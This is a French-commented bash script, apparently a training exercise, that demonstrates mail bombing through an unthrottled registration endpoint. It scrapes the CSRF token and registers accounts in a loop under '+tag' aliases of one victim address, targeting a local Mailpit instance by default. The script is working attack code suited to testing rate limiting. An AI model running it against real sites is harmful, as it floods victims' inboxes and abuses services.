#!/usr/bin/env bash
# Exercice 10 — démonstration : mail bombing via /inscription
#
# /inscription envoie un vrai email d'activation à chaque inscription, sans
# aucune limite de requêtes. En exploitant l'alias "+tag" (supporté par la
# plupart des fournisseurs : victime+1@example.com arrive dans la boîte de
# victime@example.com), on peut créer un compte différent à chaque requête
# tout en spammant la même boîte mail réelle.
#
# Usage : ./mail_bomb.sh <email_victime> [nombre] [url]
# Exemple : ./mail_bomb.sh victime@example.com 50
#
# Ne cible que l'instance locale par défaut (Mailpit capture tout, aucun mail
# ne part réellement sur Internet). Vérifie le résultat via l'API Mailpit.
set -u

VICTIM=${1:?"usage: $0 <email_victime> [nombre] [url]"}
MAX=${2:-50}
BASE=${3:-https://localhost:8443}
JAR=$(mktemp)
RUN=$(date +%s)
sent=0

trap 'rm -f "$JAR"' EXIT

build_alias() {
    local n=$1
    printf '%s' "$VICTIM" | sed -E "s/^([^@]+)@/\\1+${RUN}_${n}@/"
}

for i in $(seq 1 "$MAX"); do
    if (( i % 10 == 1 )); then
        : > "$JAR"
        page=$(curl -sk -c "$JAR" "$BASE/inscription")
        token=$(printf '%s' "$page" | grep -o 'name="registration\[_token\]"[^>]*value="[^"]*"' | sed 's/.*value="//;s/"$//')
    fi

    email=$(build_alias "$i")

    code=$(curl -sk -b "$JAR" -c "$JAR" -o /dev/null -w '%{http_code}' -X POST \
        -H "Origin: $BASE" \
        -H "Referer: $BASE/inscription" \
        --data-urlencode "registration[email]=$email" \
        --data-urlencode "registration[nickname]=Victim${RUN}_${i}" \
        --data-urlencode "registration[plainPassword][first]=Azerty123!" \
        --data-urlencode "registration[plainPassword][second]=Azerty123!" \
        --data-urlencode "registration[_token]=$token" \
        "$BASE/inscription")

    case "$code" in
        302) sent=$((sent + 1)); state="mail d'activation envoyé à $email" ;;
        422) state="formulaire refusé (validation ou CSRF)" ;;
        429) state="BLOQUÉ (rate limit)" ;;
        *)   state="réponse inattendue" ;;
    esac

    printf '%3d  HTTP %s  %s\n' "$i" "$code" "$state"

    if [ "$code" = "429" ]; then
        echo "--- blocage après $sent mails envoyés ---"
        exit 0
    fi
done

echo "--- terminé : $sent mails envoyés vers la boîte de $VICTIM sur $MAX tentatives, aucun blocage ---"
echo "--- vérifiez la boîte dans Mailpit : http://localhost:8025 ---"
